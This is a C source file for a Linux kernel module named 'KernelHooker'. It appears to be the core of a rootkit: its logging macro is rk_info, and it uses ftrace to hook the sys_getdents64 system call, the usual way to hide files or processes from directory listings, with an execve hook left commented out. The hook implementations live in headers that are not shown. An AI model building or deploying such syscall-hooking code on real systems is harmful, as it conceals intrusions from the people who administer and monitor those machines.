#include <linux/module.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "inc/ftrace/ftrace_helper.h"
#include "inc/logger/logger.h"

// ////////////////////////////////////////////////////////////////////

#include "inc/hooks/execve/execve.h"
#include "inc/hooks/execve/execve.h"
#include "inc/hooks/getdents64/getdents64.h"

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Aspheric_");
MODULE_DESCRIPTION("Core KernelHooker");

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

int err;

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

struct ftrace_hook dir_hooks[] = {
    // HOOK("sys_execve", hook_execve, &real_execve),
    HOOK("sys_getdents64", hook_getdents64, &real_getdents64),
};

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

static int __init kernelhooker_init(void) {
    rk_info("[kernelhooker_init] Loading kernelhooker module...\n");

    if ((err = fh_install_hooks(dir_hooks, ARRAY_SIZE(dir_hooks))))
        rk_info("[kernelhooker_init] failed to install hooks\n");

    rk_info("[kernelhooker_init] kernelhooker loaded!\n");

    return 0;
}

static void __exit kernelhooker_exit(void) {
    rk_info("[kernelhooker_exit] Unloading kernelhooker module...\n");

    fh_remove_hooks(dir_hooks, ARRAY_SIZE(dir_hooks));

    rk_info("[kernelhooker_exit] kernelhooker unloaded!\n");
}

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

module_init(kernelhooker_init);
module_exit(kernelhooker_exit);
